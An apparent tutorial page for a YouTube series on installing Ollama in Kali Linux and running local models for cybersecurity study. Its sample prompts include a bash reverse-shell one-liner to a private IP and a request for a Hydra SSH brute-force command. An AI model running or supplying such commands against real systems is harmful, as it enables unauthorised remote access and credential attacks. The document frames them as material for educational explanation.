# Episode 01: Setting Up Local AI in Kali Linux with Ollama 🤖🛡️

Welcome to **Episode 1** of the **AI for Cybersecurity: Zero to Hero** series by **Ethical Vyaspeeth**! 

In this episode, we set up a 100% private, offline, and free Local AI Assistant inside Kali Linux using **Ollama** and open-source models like `Llama 3` and `DeepSeek-R1`.

---

## 📺 Episode Overview
* **Channel:** Ethical Vyaspeeth
* **Series:** AI for Cybersecurity: Zero to Hero
* **Topic:** Local AI Setup in Kali Linux with Ollama
* **Language:** Hindi / Hinglish

---

## ⚙️ Prerequisites & System Requirements
* **OS:** Kali Linux (or any Debian-based Linux distro)
* **RAM:** Minimum 8 GB (16 GB Recommended)
* **Storage:** At least 10–15 GB free space for model weights
* **Privileges:** Sudo / Root access

---

## 🚀 Step-by-Step Installation Guide

### Step 1: Update Kali Linux System
Open your terminal and ensure system packages are up to date:
```bash
sudo apt update && sudo apt upgrade -y
```
### Step 2: Install Ollama via Official Script
Run the automated installation script:
```bash
curl -fsSL [https://ollama.com/install.sh](https://ollama.com/install.sh) | sh
```
### Step 3: Verify Ollama Service
Check if the background service is active and running:
```bash
systemctl status ollama
```
## 🧠 Downloading & Running AI Models
### Option A: Meta's Llama 3 (8B) - Recommended for Beginners
```bash
ollama run llama3
```
### Option B: DeepSeek-R1 (8B) - Reasoning Model
```bash
ollama run deepseek-r1:8b
```
## 💡 Practical Cybersecurity Queries to Try
Once inside the Ollama interactive prompt (>>>), try asking:

### Nmap Command Explanation:

Explain what the command "nmap -sS -sV -p- -T4 10.0.2.15" does in bullet points.

### Hydra Syntax Generation:

Give me a Hydra command to perform SSH brute-force testing on target IP 192.168.1.50 with user "admin".

### Bash One-Liner Analysis:

Explain this payload safely: bash -i >& /dev/tcp/10.0.2.15/4444 0>&1

To exit the Ollama prompt, type /bye and press Enter.

## 📝 Episode Assignment
Install Ollama and pull llama3 or deepseek-r1.

Ask the AI to explain a complex tcpdump or sqlmap command.

Share your terminal screenshot in our Telegram group or YouTube comments!

## 🔗 Useful Links & Resources
Watch Full Episode: Ethical Vyaspeeth YouTube Channel

Official Ollama Website: ollama.com

Ollama Model Library: ollama.com/library

## ⚠️ Legal & Ethical Disclaimer
This material is created for educational purposes only as part of the Ethical Vyaspeeth training curriculum. Always ensure you have explicit written permission before performing penetration testing against any target system.
